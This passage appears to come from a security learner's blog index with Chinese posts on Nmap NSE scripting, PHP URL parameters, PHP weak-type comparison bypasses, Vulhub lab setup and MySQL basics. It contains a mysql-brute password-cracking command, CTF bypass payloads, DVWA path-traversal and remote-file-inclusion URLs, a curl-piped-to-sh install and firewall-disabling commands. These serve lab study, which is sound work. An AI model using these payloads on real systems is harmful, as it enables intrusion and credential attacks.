company.com | cut -d -f 4 | nmap -v -iL\n进行DNS区域传输，以发现company.com中的主机，然后将IP地址提供给 Nmap。上述命令用于GNU&#x2F;Linux – 其它系统进行区域传输时有不同的命令。\nnmap nse脚本引擎Nmap是学习网络安全必备的一款工具，有着强大的信息收集能力。Nmap不仅仅是一个端口扫描器那么简单，它还有着一个强大的脚本引擎（NSE）可以通过编程来实现定制化。\n在nmap安装目录中,通常搜索路径为&#x2F;&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts目录存放着NSE脚本，而nselib目录存放各种库文件，通常使用–script来指定要使用的nmap脚本。比如：使用mysql-brute.nse这个脚本对目标地址进行mysql的口令爆破。命令：\nnmap --script&#x3D;mysql-brute  &lt;target&gt;,\n\n在Nmap的官方说明文档https://nmap.org/nsedoc/中有NSE脚本和库文件的详细使用说明。\nNSE编写demo文件:LUA语言基础打开任何一个NSE脚本或者是库文件，里面的代码功能通常由lua语言来实现。因此想要写自己的脚本或者库，前提是有一定的lua语言基础。lua是一个轻量化的脚本语言，有编程基础的同学学lua应该会比较轻松，在菜鸟教程花个把小时学习lua语言的基本使用，已经足够明白本篇的编程内容了。\nNSE脚本基本格式:一个完整的NSE脚本通常都有这么几个部分的代码字段：description 字段：本脚本的说明介绍。categories 字段：本脚本的分类。Nmap执行脚本除了指定单个脚本外，还可以指定某一类脚本，比如default类，我们没有使用–script参数时，默认会加载这一类的脚本。rule 字段：本脚本的执行规则，也即触发脚本执行的条件会在rule字段定义。一般执行规则是一个lua函数，返回值只有true和false两种。action字段：脚本执行的具体内容。rule字段返回true时会执行action字段定义的函数。\n-- 包含nselib中的包\nlocal shortport &#x3D; require &quot;shortport&quot;\n-- 描述\ndescription &#x3D; [[a demo nse file]]\nauthor &#x3D; &quot;reborn&quot;\nlicense &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;\ncategories &#x3D; &#123;&quot;default&quot;&#125;\n-- 在发现主机端口时,被调用\nportrule &#x3D; function( host, port )\n    return true\nend\n-- 当portrule返回true时action被执行\naction &#x3D; function(host, port)\nend\nNSE脚本的规则你可以发现上述rule字段是portrule，NSE脚本的执行规则是和nmap的扫描相结合的，两者执行的先后顺序目前有如下4种。\n\nprerule()：规则早于nmap的扫描，执行的顺序是先执行脚本，后nmap扫描。\nhostrule()：nmap完成了主机发现之后运行脚本。\nportrule()：nmap执行了端口扫描后运行脚本。\npostrule()：nmap完成所有的扫描后才执行脚本。\n\n编写简单的NSE脚本\n如：编写一个简单的脚本来探测目标是否开放了80端口，并且这个端口运行的是HTTP服务，如果是nmap输出“This is a WebServer”。那么在前面脚本demo代码的基础上，我们只需修改portrule函数的代码和让action函数来输出。代码逻辑先portrule判断条件是否成立：“目标是否开放了80端口，服务是否是HTTP”，是返回true不是返回false，代码实现：\nportrule &#x3D; function(host,port)\n    return port.protocol &#x3D;&#x3D; &quot;tcp&quot; and port.number &#x3D;&#x3D; 80 and port.service &#x3D;&#x3D;&quot;http&quot; and port.state &#x3D;&#x3D;&quot;open&quot;\nend\n\n如果返回true：执行action，输出“This is a WebServer”：\naction &#x3D; function(host, port)\nreturn &quot;This is a WebServer&quot;\nend\n\n完整的代码：\nlocal shortport &#x3D; require &quot;shortport&quot;\ndescription &#x3D; [[a http service detect test demo]]\n\nauthor &#x3D; &quot;reborn&quot;\nlicense &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;\ncategories &#x3D; &#123;&quot;default&quot;&#125;\n\nportrule &#x3D; function(host,port)\n    return port.protocol &#x3D;&#x3D; &quot;tcp&quot; and port.number &#x3D;&#x3D; 80 and port.service &#x3D;&#x3D;&quot;http&quot; and port.state &#x3D;&#x3D;&quot;open&quot;\nend\n\naction &#x3D; function(host, port)\nreturn &quot;This is a WebServer&quot;\nend\n\n将上述代码命名为http-detect-test.nse保存在scripts目录下，然后执行nmap --script-updatedb更新nse脚本。\n接着在nmap中执行http-detect-test.nse这个脚本：nmap -p 80 10.10.10.39 --script http-detect-test\nPORT   STATE SERVICE\n\n80&#x2F;tcp open  http\n\n|_http-detect-test: This is a WebServer\n\n另外，如果执行过程，脚本有错误，可以在nmap命令中加入-d来获得调试中的数据。其中-d后面可以添加数字1 2 3 4代表详细级别,可以看到程序的每一步执行过程;\nNSE中的API你可能会对上面脚本中portrule规则判断扫描结果的代码心存疑惑，实际上那个位置调用了nmap扫描结果的API。\nNmap中的API的核心功能就是向脚本提供关于主机和端口的信息，例如名字解析、主机和端口的状态、服务发现等内容。此处介绍一部分常用的的API调用和代码demo供给大家参考使用。\n两个Lua table 类型的参数\n\nhost table\nport table\n\nhost table1. host.os获取nmap扫描到的操作系统信息。\n\nvendor 供应商\nosfamily 所属系列\nosgen 具体型号\ntype 设备类型\nCPE\n\nlocal shortport &#x3D; require &quot;shortport&quot;\n\ndescription &#x3D; [[test api]]\n\nauthor &#x3D; &quot;reborn&quot;\nlicense &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;\ncategories &#x3D; &#123;&quot;default&quot;&#125;\n\nhostrule &#x3D; function( host, port )\n    return true\nend\n\naction &#x3D; function(host, port)\n    return host.os\nend\n\n扫描命令：nmap -O 10.10.10.39 --script my-api-test\nHost script results:\n| my-api-test:\n|\n|     name: Linux 2.6.13 - 2.6.32\n|     classes:\n|\n|         type: general purpose\n|         vendor: Linux\n|         osgen: 2.6.X\n|         osfamily: Linux\n|         cpe:\n|_          cpe:&#x2F;o:linux:linux_kernel:2.6\n\n2. host.ip将host.os那段脚本的第14行改为return host.ip。\n扫描命令：nmap www.baidu.com --script my-api-test\nHost script results:\n|_my-api-test: 14.215.177.38\n\n3.host.name将host.os那段脚本的第14行改为return host.name。\n扫描命令：nmap www.baidu.com --script my-api-test\nHost script results:\n|_my-api-test: 14.215.177.38\n\n4.host.targetname目标主机在命令行的名字。\n5.host.directly_connected表示目标计算机是否与我们同在一个子网。\n6.host.name将host.os那段脚本的第14行改为return host.mac_addr。\n扫描命令：nmap 10.10.10.39 --script my-api-test 必须是同一子网的设备这个命令才有效。\nHost script results:\n|_my-api-test: \\x00\\x0C)f\\xF4\\xDF\n\n7.host.traceroute将host.os那段脚本的第14行改为return host.traceroute。\n扫描命令：nmap --traceroute www.baidu.com --script my-api-test\nHost script results:\n| my-api-test:\n|\n|     times:\n|       srtt: 0.002\n|     ip: 192.168.1.1\n|\n|     times:\n|       srtt: 0.004\n|     ip: 192.168.12.1\n|\n|     times:\n|       srtt: 0.002\n|     ip: 192.168.200.1\n|\n|     name: 78.228.84.110.broad.fz.fj.dynamic.163data.com.cn\n|     ip: 110.84.228.78\n|     times:\n|       srtt: 0.002\n|\n|     times:\n|       srtt: 0.017\n|     ip: 113.96.4.70\n|\n|     times:\n|       srtt: 0.017\n|_    ip: 14.215.177.39\n\nport table1. port.numberlocal shortport &#x3D; require &quot;shortport&quot;\n\ndescription &#x3D; [[test api]]\n\nauthor &#x3D; &quot;reborn&quot;\nlicense &#x3D; &quot;Same as Nmap--See http:&#x2F;&#x2F;nmap.org&#x2F;book&#x2F;man-legal.html&quot;\ncategories &#x3D; &#123;&quot;default&quot;&#125;\nportrule &#x3D; function( host, port )\n    return true\nend\n\naction &#x3D; function(host, port)\n    return port.number\nend\n\n扫描命令：nmap www.baidu.com --script my-api-test\nPORT    STATE SERVICE\n80&#x2F;tcp  open  http\n|_my-api-test: 80\n443&#x2F;tcp open  https\n|_my-api-test: 443\n\n2. port.protocolPORT    STATE SERVICE\n80&#x2F;tcp  open  http\n|_my-api-test: tcp\n443&#x2F;tcp open  https\n|_my-api-test: tcp\n\n3. port.servicePORT    STATE SERVICE\n80&#x2F;tcp  open  http\n|_my-api-test: http\n443&#x2F;tcp open  https\n|_my-api-test: https\n\n4. port.versionPORT    STATE SERVICE\n80&#x2F;tcp  open  http\n| my-api-test:\n|   name_confidence: 3.0\n|   service_tunnel: none\n|   name: http\n|   service_dtype: table\n|_  cpe:\n443&#x2F;tcp open  https\n| my-api-test:\n|   name_confidence: 3.0\n|   service_tunnel: none\n|   name: https\n|   service_dtype: table\n|_  cpe:\n\n5.port.statePORT    STATE SERVICE\n80&#x2F;tcp  open  http\n|_my-api-test: open\n443&#x2F;tcp open  https\n|_my-api-test: open","slug":"Nmap扫描基础","date":"2023-01-10T13:21:22.708Z","categories_index":"在线笔记","tags_index":"工具","author_index":"Abyssaler"},{"id":"7ed8089baf30886b0aa7735f2db515b2","title":"php怎么通过url传参","content":"php怎么通过url传参​\t目前正在学php基础,遇到一个困扰我的问题,那就是通过使用_GET[]的方式获取url中所传的参数中?的用途,如下图:\n\n123.php页面代码如图\n\n为什么通过在127.0.0.1&#x2F;php.123后面输入?target&#x3D;import.php后var_dump函数会把target当成关联数组里面的key从而取出target被赋予的值呢?这其中?起了什么作用\n通过了解得知,?表示传参,拿127.0.0.1&#x2F;php.123?target&#x3D;import.php举例子,?表示对当前php.123页面进行传参,传参的内容为名为target,值为import.php的这样一个参数.这引起了我的好奇,因为?在php语法中是一个三元运算符\n错误思路:三元运算符?作为三元运算符的的语法格式是:(expr1) ? (expr2) : (expr3),对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3.\n当我顺着这个思路再看url&#x2F;?target&#x3D;import.php这串代码时,怎么看怎么抽象,于是乎,继续查\n正解:url&#x2F;?x&#x3D;是php中的一项基本技巧通过检索网上其他的文章,得知使用url传递参数是php中的一项基本技巧，一般格式为url&#x2F;?x&#x3D;,这其中?是一种url固定的格式 ，在url格式中表示传参，这里不应该用php的语法去理解它。\n举例，如果要通过url传递一个参数n&#x3D;5，那么url应当为url&#x2F;?n&#x3D;5，php页面中应当包含如下代码：\n$n &#x3D; $_GET[‘n’];\n\n这就是一种固定的格式,纯粹是自己想多了…\n不过既然都查到这里来了,就顺便再深入一下\n显而易见，这种方法将会把参数暴露出来，安全系数较低。因此，可以有一种 URL 的编码方式，对 URL 传递的参数进行编码。以此让参数不可见\nurlencode(string)urlencode()函数实现将字符串 string 进行 URL 编码。应用urlencode()函数对 URL 传递的参数值进行编码，显示的字符串是URL 编码后的字符串，其实现的代码如下所示：\n&lt;?php\n$url &#x3D; urlencode(&quot;你想传入的参数&quot;);&#x2F;&#x2F;对参数编码\necho&quot;123.php?id&#x3D;&quot;.$url;\n?&gt;\n\n在浏览器中输入运行地址，按回车键，得到如下所示的运行结果：\nindex.php?id&#x3D;PHP%E4%B8%AD%E6%96%87%E7%BD%91\n\n这同时说明了对于服务器而言，编码前后的字符串并没有什么区别，服务器能够自动识别.\n","slug":"php怎么通过url传参","date":"2023-01-10T13:21:22.708Z","categories_index":"学习笔记","tags_index":"php","author_index":"Abyssaler"},{"id":"ce536701181d097db34a6f82f02496a3","title":"php弱类型比较以及绕过","content":"PHP中的弱类型比较php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换\n0.强类型与弱类型强类型\n•所谓强类型(Strongly typed)，顾名思义就是强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是这个数据类型。J\n•ava、.NET、C++等都是强类型语言，在变量使用之前必须声明变量的类型和名称；且不经强制转换不允许两种不同类型的变量互相操作。\n弱类型\n•对数据的类型要求并不严格，可以让数据类型互相转换。\n1.&#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;的区别php中其中两种比较符号:\n&#x3D;&#x3D;：先将字符串类型转化成相同，再比较&#x3D;&#x3D;&#x3D;：先判断两种字符串的类型是否相等，再比较\nPHP转换规则字符串和数字比较使用&#x3D;&#x3D;时,字符串会先转换为数字类型再比较，若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）或null，则转换为0；例如\nvar_dump(12&#x3D;&#x3D;&quot;12&quot;)                                 &#x2F;&#x2F;true\nvar_dump(12&#x3D;&#x3D;&quot;12aa&quot;)                               &#x2F;&#x2F;true\nvar_dump( &quot;admin&quot;&#x3D;&#x3D;0)\t\t\t\t\t\t\t    &#x2F;&#x2F;true\nvar_dump(false&#x3D;&#x3D;&quot;&quot;&#x3D;&#x3D;0&#x3D;&#x3D;NULL)\t\t\t\t\t\t&#x2F;&#x2F;true\n\n例子2：\nvar_dump(&#39;a&#39; &#x3D;&#x3D; 0);\t    &#x2F;&#x2F;bool(true)\nvar_dump(&#39;1a&#39; &#x3D;&#x3D; 1);\t&#x2F;&#x2F;bool(true)\nvar_dump(&#39;12a&#39; &#x3D;&#x3D; 1);\t&#x2F;&#x2F;bool(false)\n\n会出现上面的结果是因为字符串在和数字比较的时候会将字符串转化为数字，比如a转换失败成False，False又和0弱类型比较是相等的，所以第一个是true。\n但是如果字符串是以数字开头的，那么就会转成这个数字再做比较，所以第二个也是true，第三个则是因为转成数字后变成了12，不等于1，则为false。\n2.布尔型和任意比较布尔值true和任意字符串都弱相等，除了0和false，因为0也认为是bool false，true是不等于false的，例如:\nvar_dump(true&#x3D;&#x3D;&quot;hyuf&quot;)                   &#x2F;&#x2F;true\nvar_dump(True &#x3D;&#x3D; 0);\t                 &#x2F;&#x2F;bool(false)\nvar_dump(True &#x3D;&#x3D; &#39;False&#39;);\t             &#x2F;&#x2F;bool(true)\nvar_dump(True &#x3D;&#x3D; 2);\t                 &#x2F;&#x2F;bool(true)\n\n\n\n3.hash值和字符串“0”比较$str1 &#x3D; &quot;a&quot;;\necho md5($str1);\t&#x2F;&#x2F;0cc175b9c0f1b6a831c399e269772661\nvar_dump(md5($str1) &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(false)\n---------------------------------------------------------\n$str2 &#x3D; &quot;s224534898e&quot;;\necho md5($str2);\t&#x2F;&#x2F;0e420233178946742799316739797882\nvar_dump(md5($str2) &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(true)\n---------------------------------------------------------\n$str3 &#x3D; &#39;a1b2edaced&#39;;\necho md5($str3);\t&#x2F;&#x2F;0e45ea817f33691a3dd1f46af81166c4bool\nvar_dump(md5($str3) &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(false)\n---------------------------------------------------------\nvar_dump(&#39;0e111111111111&#39; &#x3D;&#x3D; &#39;0&#39;);\t&#x2F;&#x2F;bool(true) \n\n\n\n\n其实我觉得这个不应该叫做hash值和字符串0的比较，应该叫做科学计数法和字符串和0的比较，只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，因为不管0不论和多少相乘都是0。\n所以当hash出来的32个值，开头前两个为0e，后面全部为数字的话，他们就会和字符串0相等的。\n第一条只是0开头，所以只能当普通字符串，结果为false。\n第二条0e后面全为数字，符合要求，结果为true。\n第三条虽然为0e，但是后面不全为数字，所以结果为false。\n最后一条就是告诉大家，不是只有hash才能和字符串0相等。\n数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；\n当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,’E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。\n\n4.Strcmp函数的漏洞strcmp()用法如下\n\n有一些细节需要注意下\nstrcmp(s1，s2)\n说明：\n\n当s1&lt;s2时，返回为负数 注意不一定是-1，测试结果是比较字符串长度\n当s1&#x3D;&#x3D;s2时，返回值&#x3D; 0\n当s1&gt;s2时，返回正数 注意不一定是1，测试结果是比较字符串长度\n如果两个字符串不同等，但是字符串长度相同，就比较从哪一位开始不同的，然后比较那一位的大小。\n\n即：两个字符串自左向右逐个字符相比（按ASCII值大小相比较），直到出现不同的字符或遇&#39;\\0&#39;为止。如：\n&quot;A&quot;&lt;&quot;B&quot; &quot;a&quot;&gt;&quot;A&quot; &quot;computer&quot;&gt;&quot;compare&quot;\n\n\n\n特别注意：strcmp(const char *s1,const char * s2)这里面只能比较字符串，不能比较数字等其他形式的参数，如果出现了其它参数，则会retrun null，有些题目就是利用这一点来进行和0的完成比较。\n不过测试的结果是只有数组的时候才会出现这个问题，数字不会，和网上的资料有点出入。\n&lt;?php\n$test &#x3D; 8;\nif (strcmp($test,&quot;test&quot;))&#123;\n\techo &quot;ok!&quot;;\n\techo &quot;\\n&quot;;\n\techo strcmp($test,&quot;test&quot;);\n\t&#125;\nelse \n\techo &quot;oh no!&quot;\n?&gt;\n\n\n运行结果\n\nok!\n-1  \n\n\n\n传入的是数字，返回的是-1而不是0，但传入数组就不一样了。\n&lt;?php\n$test &#x3D; array();\n$test[0]&#x3D;1;\nprint_r($test);\n\nif (strcmp($test,&quot;test&quot;))&#123;\n\techo &quot;ok!&quot;;\n\techo &quot;\\n&quot;;\n\techo strcmp($test,&quot;test&quot;);\n\t&#125;\nelse \n\techo &quot;oh no!&quot;\n?&gt;\n\n运行结果\n\nArray\n(\n    [0] &#x3D;&gt; 1\n)\noh no!\nPHP Warning:  strcmp() expects parameter 1 to be string, array given in &#x2F;box&#x2F;main.php on line 6\n\n\n\n\n各种绕过1.switch绕过\n具体原理参考站内：\n\n\n\n\n\n\n\n\n\nhttps://abyssaler.github.io/post/ctf%E4%B9%8Bwake_php\n2.&#x3D;&#x3D;绕过PHP比较运算符 &#x3D;&#x3D;在进行比较的时候是弱类型比较，只需要比较两个值相等就行，不会比较类型\n绕过方法如：1&#x3D;1.0,1&#x3D;+1\n$a&#x3D;1;\n\nif($a&#x3D;&#x3D;$_GET[&#39;x&#39;])&#123;\n    echo $flag;\n\n&#125;\n\n&#x2F;&#x2F;使用1.0就可以绕过 \n\nif($_GET[&#39;name&#39;] !&#x3D; $_GET[&#39;password&#39;])&#123;\n    if(MD5($_GET[&#39;name&#39;]) &#x3D;&#x3D; MD5($_GET[&#39;password&#39;]))&#123;\n        echo $flag;\n\n    &#125;\n\n    echo &#39;?&#39;;\n\n&#125;\n\n&#x2F;&#x2F;MD5(&#39;QNKCDZO&#39;)&#x3D;&#x3D;MD5(&#39;240610708&#39;)\n\n&#x2F;&#x2F;echo MD5(&#39;QNKCDZO&#39;);\n\n&#x2F;&#x2F;echo MD5(&#39;240610708&#39;);\n\nPHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。\n\n\n\n3.&#x3D;&#x3D;&#x3D;绕过PHP比较运算符 &#x3D;&#x3D;&#x3D;在进行比较的时候，会先判断两种字符串的类型是否相等，再比较值是否相等。只要两边字符串类型不同会返回false\n绕过方法：使用数组绕过\nif($_GET[&#39;name&#39;] !&#x3D; $_GET[&#39;password&#39;])&#123;\n    if(MD5($_GET[&#39;name&#39;]) &#x3D;&#x3D; MD5($_GET[&#39;password&#39;]))&#123;\n        echo $flag;\n\n    &#125;\n\n    echo &#39;?&#39;;\n\n&#125;\n\n&#x2F;&#x2F;name[]&#x3D;1&amp;password[]&#x3D;2\n\nPHP中md5()函数无法处理数组（会返回NULL）\n\n&#x3D;&#x3D;的也可以用数组绕过\n\n\n\n4.intval()函数intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1（注意这个通常配合preg_match来使用）\n语法\nint intval ( mixed $var [, int $base &#x3D; 10 ] )\n参数说明：\n\n$var：要转换成 integer 的数量值。\n$base：转化所使用的进制。\n\n如果 base为空，通过检测 var 的格式来决定使用的进制：\n\n如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；\n否则，如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；\n否则，将使用 10 进制 (decimal)。\n\n绕过方法：通过使用0x或者0开始的格式来绕过不相等的判断（像一些要先判断不相等再判断相等的题目）\n$i&#x3D;&#39;666&#39;;\n\n$ii&#x3D;$_GET[&#39;n&#39;];\n\nif(intval($ii&#x3D;&#x3D;$i,0 ))&#123;\n    echo $flag;\n\n&#125;\n\n&#x2F;&#x2F;n&#x3D;0x29a   666的二进制是29a\n\n通过检测 $ii的格式来决定使用的进制\n\n\n\n5.strpos()函数strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。(函数返回查找到这个find字符串的位置，那么如果是0位置，就值得注意了)\n注释：strpos() 函数是区分大小写的。\nstrpos(string,find,start)\n\n参数\t\t描述\nstring\t必需。规定被搜索的字符串。\nfind\t必需。规定要查找的字符。\nstart\t可选。规定开始搜索的位置\n\n\n绕过方法：利用换行进行绕过（%0a） \n$i&#x3D;&#39;666&#39;;\n\n$ii&#x3D;$_GET[&#39;h&#39;];\n\nif(strpos($ii,$i,&quot;0&quot;))&#123;\n    echo $flag;\n\n&#125;\n\n&#x2F;&#x2F;?num&#x3D;%0a666\n\n\n\n6.in_array()函数in_array() 函数搜索数组中是否存在指定的值。\nbool in_array ( mixed $needle , array $haystack [, bool $strict &#x3D; FALSE ] )\n参数\t\t\t描述\nneedle\t\t必需。规定要在数组搜索的值。\nhaystack\t必需。规定要搜索的数组。\nstrict\t\t可选。如果该参数设置为 TRUE，则 in_array() 函数检查搜索的数据与数组的值的类型是否相同。\n\n问题就出在第三个参数，如果第三个参数不设置为true就不检测类型，是弱比较，相当于&#x3D;&#x3D;号\n绕过方法：与&#x3D;&#x3D;一样 \n$whitelist &#x3D; [1,2,3];\n\n$page&#x3D;$_GET[&#39;i&#39;];\n\nif (in_array($page, $whitelist)) &#123;\n    echo &quot;yes&quot;;\n\n&#125;\n\n&#x2F;&#x2F;?i&#x3D;1ex\n\n\n\n7.preg_match()函数preg_match 函数用于执行一个正则表达式匹配。\n详细用法可以参考：https://www.runoob.com/php/php-preg_match.html\n绕过方法：preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错,如果正则不匹配多行(&#x2F;m)也可用上面的换行方法绕过\nif(isset($_GET[&#39;num&#39;]))&#123;\n    $num &#x3D; $_GET[&#39;num&#39;];\n\n    if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;[t1] \n\n        die(&quot;no no no!&quot;);\n\n    &#125;\n\n    if(intval($num))&#123;\n        echo $flag;\n\n    &#125;\n\n&#125;\n\n&#x2F;&#x2F;?num[]&#x3D;1\n\n上面介绍过了，intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1\n\n\n\n8.str_replace函数str_replace() 函数用于替换字符串中指定字符（区分大小写）\n&lt;?php\necho str_replace(&quot;world&quot;,&quot;Peter&quot;,&quot;Hello world!&quot;);\n?&gt;\n\n&#x2F;&#x2F;输出：Hello Peter!\n\nstr_replace(find,replace,string,count)\n\n参数\t\t描述\nfind\t必需。规定要查找的值。\nreplace\t必需。规定替换 find 中的值的值。\nstring\t必需。规定被搜索的字符串。\ncount\t可选。一个变量，对替换数进行计数。\n\n\n绕过方法：str_replace无法迭代过滤 ，可以通过双写绕过\n例如：例如page&#x3D;hthttp://tp://192.168.0.103/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.0.103/phpinfo.txt，成功执行远程命令。\n三个实例：\n\n1、本地文件包含\nhttp:&#x2F;&#x2F;192.168.0.103&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;page&#x3D;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;xampp&#x2F;htdocs&#x2F;dvwa&#x2F;php.ini\n2、绝对路径不受任何影响\nhttp:&#x2F;&#x2F;192.168.0.103&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;page&#x3D;C:&#x2F;xampp&#x2F;htdocs&#x2F;dvwa&#x2F;php.ini\n3、远程文件包含\nhttp:&#x2F;&#x2F;192.168.0.103&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;page&#x3D;htthttp:&#x2F;&#x2F;p:&#x2F;&#x2F;192.168.5.12&#x2F;phpinfo.txt\n\n\n\n9.json绕过&lt;?php\nif (isset($_POST[&#39;message&#39;])) &#123;\n    $message &#x3D; json_decode($_POST[&#39;message&#39;]);\n    $key &#x3D;&quot;*********&quot;;\n    if ($message-&gt;key &#x3D;&#x3D;$key ) &#123;\n        echo &quot;flag&quot;;\n    &#125; \n    else &#123;\n        echo &quot;fail&quot;;\n    &#125;\n &#125;\n else&#123;\n     echo &quot;~~~~&quot;;\n &#125;\n?&gt;\n\n输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于$key的值，但是$key的值我们不知道\n这时我们构造一个和任意字符串返回为真的数组{“key”:true}。即可绕过\npayload&#x3D;message&#x3D;{“key”,true}\n10.array_search的漏洞array_search() 函数与 in_array() 一样，在数组中查找一个键值。如果找到了该值，匹配元素的键名会被返回。如果没找到，则返回false。\n&lt;?php\n$a&#x3D;array(1,4);\nvar_dump(array_search(&quot;4admin&quot;,$a)); &#x2F;&#x2F; int(0)&#x3D;&gt; 返回键值1\nvar_dump(array_search(&quot;1admin&quot;,$a)); &#x2F;&#x2F; int(1) &#x3D;&#x3D;&gt;返回键值0\n?&gt;&#x2F;&#x2F;这个和之前的类型转换类似，但是如果是array_search(“4admin”,$a,true),最后的“true”会禁止类型转换。\n\n这个和之前的类型转换类似，但是如果是array_search(“4admin”,$a,true),最后的“true”会禁止类型转换\n部分内容引用自：\n\n\n\n\n\n\n\n\n\nhttps://zhuanlan.zhihu.com/p/30323499\nhttps://blog.csdn.net/u014029795/article/details/99709333\nhttps://www.csdn.net/tags/MtTaMg2sNTc4NDM0LWJsb2cO0O0O.html\n","slug":"php弱类型比较及绕过","date":"2023-01-10T13:21:22.708Z","categories_index":"学习笔记","tags_index":"php","author_index":"Abyssaler"},{"id":"1fa64911bbe068fc2410b2322a01cf3e","title":"vulhub靶场环境搭建","content":"概述Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行一条命令即可编译、运行一个完整 的漏洞靶场镜像。 \nVulhub是一个基于 docker 和 docker-compose 的漏洞环境集合，进入对应目录并执行一条语句即可启 动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。\n安装环境安装dockersapt-get install curl\ncurl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh\n\n\n\n\n\n配置镜像加速器mkdir -p &#x2F;etc&#x2F;docker\n\ntee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;\n&#123;\n&quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;kn5vuonk.mirror.aliyuncs.com&quot;]\n&#125;\nEOF\n\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n\n\n\n安装pipapt install python3-pip\n\n\n安装docker-composepip install docker-compose\n\n\n安装gitapt-get install git\n\n\n将vulhub压缩包上传到服务器这里我是直接将压缩包放到虚拟机里面解压的\n\n启动环境docker-compose会自动查找当前目录下的配置文件（默认文件名为 docker-compose.yml ），并根据 其内容编译镜像和启动容器。\n 所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。 \n在vulhub中选择某个环境，进入对应的目录，如Flask服务端模板注入漏洞，进入flash目录\n\n我这里是进入tomcat目录\n\n对漏洞靶场进行编译和运行\ndocker-compose build\n或者\ndocker-commpose up -d\n\n注意： docker-compose up -d 运行后，会自动查找当前目录下的配置文件。如果配置文件中包含的环 境均已经存在，则不会再次编译；如果配置文件中包含的环境不存在，则会自动进行编译。所以，其实 docker-compose up -d 命令是包含了 docker-compose build 的\n\n查看端口映射关系sudo docker-compose config\n\n\nsudo docker-compose ps\n\n\n连接漏洞查看了端口映射过后直接在浏览器输入ip地址加端口号就可访问漏洞了\n\n关闭环境在关闭及移除环境的时候，也需要在对应目录下，执行下列命令\ndocker-compose down\n\n上述命令会执行如下几个动作：\n\n关闭正在运行的容器\n删除所有相关容器\n移除NAT（docker-compose在运行的时候会创建一个NAT网段）\n\n但不会移除编译好的漏洞镜像，下次再执行docker-compose up -d命令，就不需要再次编译相关镜像了。\n\nPS在主机中连接虚拟机的漏洞环境可能会出现超时无法响应的现象，但是在虚拟机中能访问\n\n\n是因为虚拟机没关防火墙的原因\n ubuntu关闭和开启防火墙\n1.关闭ubuntu的防火墙：ufw disable\n\n2.开启防火墙：ufw enable\n\n3.卸载了iptables:apt-get remove iptables\n\n4.关闭ubuntu中的防火墙的其余命令:\n    iptables -P INPUT ACCEPT\n    iptables -P FORWARD ACCEPT\n    iptables -P OUTPUT ACCEPT\n    iptables -F\n\n\n在虚拟机中关闭防火墙就好了\n\n","slug":"vulhub靶场环境搭建","date":"2023-01-10T13:21:22.708Z","categories_index":"环境配置","tags_index":"vulhub","author_index":"Abyssaler"},{"id":"fb8cab7394f8a5dac8ef147ae6234738","title":"MYSQL在线笔记1","content":"mysql0.数据库常见概念0.1概念数据库：        英文单词DataBase，简称DB。按照一定格式存储数据的一些文件的组合。        顾名思义：存储数据的仓库，实际上就是一堆文件。这些文件中存储了        具有特定格式的数据。\n数据库管理系统：    DataBaseManagement，简称DBMS。    数据库管理系统是专门用来管理数据库中数据的，数据库管理系统可以    对数据库当中的数据进行增删改查。\n常见的数据库管理系统：    MySQL、Oracle、MS SqlServer、DB2、sybase等….\nSQL：结构化查询语言    程序员需要学习SQL语句，程序员通过编写SQL语句，然后DBMS负责执行SQL    